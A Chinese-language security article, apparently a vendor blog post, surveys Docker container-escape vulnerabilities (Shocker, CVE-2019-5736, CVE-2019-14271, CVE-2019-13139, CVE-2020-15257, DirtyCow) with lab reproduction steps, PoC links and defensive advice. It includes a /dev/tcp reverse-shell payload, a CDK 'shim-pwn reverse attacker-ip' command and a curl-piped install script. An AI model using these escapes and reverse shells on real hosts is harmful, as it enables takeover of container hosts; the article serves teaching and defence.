**Docker程序漏洞导致的逃逸**
**Shocker攻击**
**漏洞描述**
从Docker容器逃逸并读取到主机某个目录的文件内容。Shocker攻击的关键是执行了系统调用open_by_handle_at函数，Linux手册中特别提到调用open_by_handle_at函数需要具备CAP_DAC_READ_SEARCH能力，而Docker1.0版本对Capability使用黑名单管理策略，并且没有限制CAP_DAC_READ_SEARCH能力，因而引发了容器逃逸的风险。
**漏洞影响版本**
Docker版本 1.0， 存在于 Docker 1.0 之前的绝大多数版本(目前基本上不会存在了)
**POC**
[https://](https://link.zhihu.com/?target=https%3A//github.com/gabrtv/shocker)[github.com/gabrtv/shock](https://link.zhihu.com/?target=https%3A//github.com/gabrtv/shocker)[er](https://link.zhihu.com/?target=https%3A//github.com/gabrtv/shocker)
**runC容器逃逸漏洞（CVE-2019-5736）**
**漏洞描述**
Docker 18.09.2之前的版本中使用了的runc版本小于1.0-rc6，因此允许攻击者重写宿主机上的runc
二进制文件，攻击者可以在宿主机上以root身份执行命令。
**漏洞影响版本**
Docker版本 18.09.2，runc版本 1.0-rc6，一般情况下，可通过 docker 和docker -version查看当前版本情况。
**POC**
[https://](https://link.zhihu.com/?target=https%3A//github.com/Frichetten/CVE-2019-5736-PoC)[github.com/Frichetten/C](https://link.zhihu.com/?target=https%3A//github.com/Frichetten/CVE-2019-5736-PoC)[VE-2019-5736-PoC](https://link.zhihu.com/?target=https%3A//github.com/Frichetten/CVE-2019-5736-PoC)
**攻击流程**
1、漏洞环境搭建(Ubuntu 18.04)
自动化搭建
curl[https://](https://link.zhihu.com/?target=https%3A//gist.githubusercontent.com/thinkycx/e2c9090f035d7b09156077903d6afa51/raw)[gist.githubusercontent.com](https://link.zhihu.com/?target=https%3A//gist.githubusercontent.com/thinkycx/e2c9090f035d7b09156077903d6afa51/raw)[/thinkycx/e2c9090f035d7b09156077903d6afa51/raw](https://link.zhihu.com/?target=https%3A//gist.githubusercontent.com/thinkycx/e2c9090f035d7b09156077903d6afa51/raw)-o
install.sh && bash install.sh
docker拉取镜像慢的话可以自行百度换源
2、下载poc并修改编译
git
clone[https://](https://link.zhihu.com/?target=https%3A//github.com/Frichetten/CVE-2019-5736-PoC)[github.com/Frichetten/C](https://link.zhihu.com/?target=https%3A//github.com/Frichetten/CVE-2019-5736-PoC)[VE-2019-5736-PoC](https://link.zhihu.com/?target=https%3A//github.com/Frichetten/CVE-2019-5736-PoC)
修改paylod
vi main.go
payload = “#!/bin/bash \n bash -i >& /dev/tcp/ip/port 0>&1”
编译poc
CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build main.go
需要提前安装golang-go和gccgo-go
3、复制编译好的poc到docker里
docker cp main 52fd26fd140f:/tmp
4、在docker里运行main文件
5、模拟管理员通过exec进入容器，触发payload
sudo docker exec -it 52fd26fd140f /bin/bash
6、成功获取宿主机反弹回来的shell
漏洞复现成功之后，docker容器将无法使用
**Docker cp命令容器逃逸攻击漏洞（CVE-2019-14271）**
**漏洞描述**
当Docker宿主机使用cp命令时，会调用辅助进程docker-tar，该进程没有被容器化，且会在运行时动态加载一些libnss*.so库。黑客可以通过在容器中替换libnss*.so等库，将代码注入到docker-tar中。当Docker用户尝试从容器中拷贝文件时将会执行恶意代码，成功实现Docker逃逸，获得宿主机root权限。
**漏洞影响版本**
Docker 19.03.0
**攻击流程**
[https://](https://link.zhihu.com/?target=https%3A//unit42.paloaltonetworks.com/docker-patched-the-most-severe-copy-vulnerability-to-date-with-cve-2019-14271/)[unit42.paloaltonetworks.com](https://link.zhihu.com/?target=https%3A//unit42.paloaltonetworks.com/docker-patched-the-most-severe-copy-vulnerability-to-date-with-cve-2019-14271/)[/docker-patched-the-most-severe-copy-vulnerability-to-date-with-cve-2019-14271/](https://link.zhihu.com/?target=https%3A//unit42.paloaltonetworks.com/docker-patched-the-most-severe-copy-vulnerability-to-date-with-cve-2019-14271/)
**Docker Build时的命令注入漏洞(CVE-2019-13139)**
**漏洞描述**
攻击者能够提供或操纵“docker build”命令的构建路径将能够获得命令执行。 “docker build”处理远程 git URL
的方式存在问题，并导致命令注入到底层“git clone”命令中，导致代码在用户执行“docker build”命令的上下文中执行。
**漏洞影响版本**
Docker 18.09.4之前的版本
**攻击流程**
[https://](https://link.zhihu.com/?target=https%3A//staaldraad.github.io/post/2019-07-16-cve-2019-13139-docker-build/)[staaldraad.github.io/po](https://link.zhihu.com/?target=https%3A//staaldraad.github.io/post/2019-07-16-cve-2019-13139-docker-build/)[st/2019-07-16-cve-2019-13139-docker-build/](https://link.zhihu.com/?target=https%3A//staaldraad.github.io/post/2019-07-16-cve-2019-13139-docker-build/)
**host模式容器逃逸漏洞(CVE-2020-15257)**
**漏洞描述**
Containerd 是一个控制 runC 的守护进程，提供命令行客户端和API，用于在一个机器上管理容器。
在版本1.3.9之前和1.4.0~1.4.2的Containerd中，由于在网络模式为host的情况下，容器与宿主机共享一套Network
namespace ，此时containerd-shim
API暴露给了用户，而且访问控制仅仅验证了连接进程的有效UID为0，但没有限制对抽象Unix域套接字的访问，刚好在默认情况下，容器内部的进程是以root用户启动的。在两者的共同作用下，容器内部的进程就可以像主机中的containerd一样，连接containerd-shim监听的抽象Unix域套接字，调用containerd-shim提供的各种API，从而实现容器逃逸。
**漏洞影响版本**
containerd < 1.4.3
containerd < 1.3.9
**攻击流程**
1、漏洞环境搭建
使用ubuntu 18.04 + metarget进行搭建(使用非18.04的ubuntu镜像会出现错误)
git clone[https://](https://link.zhihu.com/?target=https%3A//github.com/brant-ruan/metarget.git)[github.com/brant-ruan/m](https://link.zhihu.com/?target=https%3A//github.com/brant-ruan/metarget.git)[etarget.git](https://link.zhihu.com/?target=https%3A//github.com/brant-ruan/metarget.git)
pip3 insta[ll -r
requirements.txt](https://link.zhihu.com/?target=https%3A//github.com/brant-ruan/metarget.git)
./metarget[cnv install
cve-2020-15257](https://link.zhihu.com/?target=https%3A//github.com/brant-ruan/metarget.git)
2、启动容器
sudo docker run -it –net=host –name=15257 ubuntu /bin/bash
在容器内执行命令cat /proc/net/unix|grep -a “containerd-shim”,来判断是否可看到抽象命名空间Unix域套接字
3、反弹宿主机的shell
攻击机监听6666端口，下载漏洞利用工具[CDK](https://link.zhihu.com/?target=https%3A//github.com/cdk-team/CDK/),将CDK传入容器tmp目录下
sudo docker cp cdk_linux_amd64 15257:/tmp
赋予工具权限，运行工具，执行反弹shell命令,成功得到一个宿主机的shell
cd /tmp
chmod 777
./cdk_linux_amd64 run shim-pwn reverse attacker-ip port
**内核漏洞导致Docker逃逸**
**DirtyCow脏牛漏洞实现Docker逃逸(CVE-2016-5195)**
**漏洞描述**
Dirty Cow（CVE-2016-5195）是Linux内核中的权限提升漏洞，通过它可实现Docker容器逃逸，获得root权限的shell。
Docker与宿主机共享内核，所以容器需要在存在dirtyCow漏洞的宿主机里
**攻击流程**
1、下载容器并运行
git
clone[https://](https://link.zhihu.com/?target=https%3A//github.com/gebl/dirtycow-docker-vdso.git)[github.com/gebl/dirtyco](https://link.zhihu.com/?target=https%3A//github.com/gebl/dirtycow-docker-vdso.git)[w-docker-vdso.git](https://link.zhihu.com/?target=https%3A//github.com/gebl/dirtycow-docker-vdso.git)
cd dirtyco[w-docker-vdso/](https://link.zhihu.com/?target=https%3A//github.com/gebl/dirtycow-docker-vdso.git)
sudo docke[r-compose run dirtycow
/bin/bash](https://link.zhihu.com/?target=https%3A//github.com/gebl/dirtycow-docker-vdso.git)
2、进入容器编译POC并运行
cd /dirtycow-vdso/
make
./0xdeadbeef ip:port
3、攻击机监听端口接受宿主机反弹的shell
nc -lvvp port
**Docker容器的防护方案**
限制容器权限：在运行容器时，可以使用命令行选项或Dockerfile指令来限制容器的访问权限，例如使用 –cap-drop选项禁止容器获得特权模式。这可以减少攻击面。
定期更新容器软件包：及时更新容器中的软件包、库和依赖项，可以修复已知漏洞并提高安全性。
配置容器网络：通过配置容器网络来控制容器之间的通信，并限制对外部系统的访问，以保护容器免受网络攻击。
加强认证和授权：设置强密码、使用多因素身份验证、限制特定用户的访问权限等方法，可以增强容器的认证和授权机制，从而限制未经授权的访问。
监视容器健康状态：实时监视容器的健康状态，对异常事件进行快速诊断和响应，可以避免未知漏洞或攻击导致的容器故障。
应用安全最佳实践：遵循安全最佳实践，如使用最小化镜像、启用安全审计、使用容器映像签名等方法，可以进一步提高容器的安全性。
**参考文献**
[https://](https://link.zhihu.com/?target=https%3A//cloud.tencent.com/developer/article/2099396)[cloud.tencent.com/devel](https://link.zhihu.com/?target=https%3A//cloud.tencent.com/developer/article/2099396)[oper/article/2099396](https://link.zhihu.com/?target=https%3A//cloud.tencent.com/developer/article/2099396)
[https://www.](https://link.zhihu.com/?target=https%3A//www.cnblogs.com/xiaozi/p/13423853.html)[cnblogs.com/xiaozi/p/13](https://link.zhihu.com/?target=https%3A//www.cnblogs.com/xiaozi/p/13423853.html)[423853.html](https://link.zhihu.com/?target=https%3A//www.cnblogs.com/xiaozi/p/13423853.html)
[https://](https://link.zhihu.com/?target=https%3A//xz.aliyun.com/t/8558)[xz.aliyun.com/t/8558](https://link.zhihu.com/?target=https%3A//xz.aliyun.com/t/8558)
[https://](https://link.zhihu.com/?target=https%3A//xz.aliyun.com/t/7881)[xz.aliyun.com/t/7881](https://link.zhihu.com/?target=https%3A//xz.aliyun.com/t/7881)
[https://www.](https://link.zhihu.com/?target=https%3A//www.cdxy.me/%3Fp%3D837)[cdxy.me/?](https://link.zhihu.com/?target=https%3A//www.cdxy.me/%3Fp%3D837)[p=837](https://link.zhihu.com/?target=https%3A//www.cdxy.me/%3Fp%3D837)
[https://www.](https://link.zhihu.com/?target=https%3A//www.cnblogs.com/xiaozi/p/13423853.html)[cnblogs.com/xiaozi/p/13](https://link.zhihu.com/?target=https%3A//www.cnblogs.com/xiaozi/p/13423853.html)[423853.html](https://link.zhihu.com/?target=https%3A//www.cnblogs.com/xiaozi/p/13423853.html)
[https://](https://link.zhihu.com/?target=https%3A//gitee.com/wangwenqin1/metarget%23/wangwenqin1/metarget/blob/master/writeups_cnv/docker-containerd-cve-2020-15257)[gitee.com/wangwenqin1/m](https://link.zhihu.com/?target=https%3A//gitee.com/wangwenqin1/metarget%23/wangwenqin1/metarget/blob/master/writeups_cnv/docker-containerd-cve-2020-15257)[etarget#/wangwenqin1/metarget/blob/master/writeups_cnv/docker-containerd-cve-2020-15257](https://link.zhihu.com/?target=https%3A//gitee.com/wangwenqin1/metarget%23/wangwenqin1/metarget/blob/master/writeups_cnv/docker-containerd-cve-2020-15257)
[https://www.](https://link.zhihu.com/?target=https%3A//www.shangyun51.com/articledetail%3Fid%3D3932)[shangyun51.com/articled](https://link.zhihu.com/?target=https%3A//www.shangyun51.com/articledetail%3Fid%3D3932)[etail?id=3932](https://link.zhihu.com/?target=https%3A//www.shangyun51.com/articledetail%3Fid%3D3932)
**重点活动推荐**
**2023年4月18日，青藤将举办“云时代，安全变了——2023云安全高峰论坛暨青藤品牌升级发布会”，会上青藤将正式发布：**
**（1）“青藤品牌新定位及Slogan”**
**（2）“青藤-先进云安全整体解决方案”及“新产品”**
**（3）国内首个“基于AI新一代入侵检测能力模型”**
**（4）国内首个《云安全能力成熟度全景图》报告**
参会报名通道